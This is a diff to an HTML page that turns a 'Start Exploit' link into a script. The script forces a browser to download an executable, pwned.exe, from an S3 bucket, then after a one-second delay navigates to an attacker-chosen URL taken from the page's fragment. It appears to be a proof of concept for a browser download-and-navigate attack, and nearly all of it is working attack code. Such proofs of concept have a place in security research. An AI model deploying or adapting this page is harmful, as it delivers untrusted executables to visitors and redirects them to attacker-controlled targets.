@@ -1,1 +1,15 @@
-<a href="https://shirleysetia-us-west-1.s3.us-west-1.amazonaws.com/pwned.exe" download="pwned.exe" onclick="location.href=location.hash.slice(1)">Start Exploit</a>
+<a href="#" onclick="startExploit(); return false;">Start Exploit</a>
+
+<script>
+function startExploit() {
+  const a = document.createElement('a');
+  a.href = 'https://shirleysetia-us-west-1.s3.us-west-1.amazonaws.com/pwned.exe';
+  a.download = 'pwned.exe';
+  a.click();
+
+  // Wait a short moment to avoid interrupting the download
+  setTimeout(() => {
+    location.href = location.hash.slice(1);
+  }, 1000); // 1 second delay (tweak as needed)
+}
+</script>
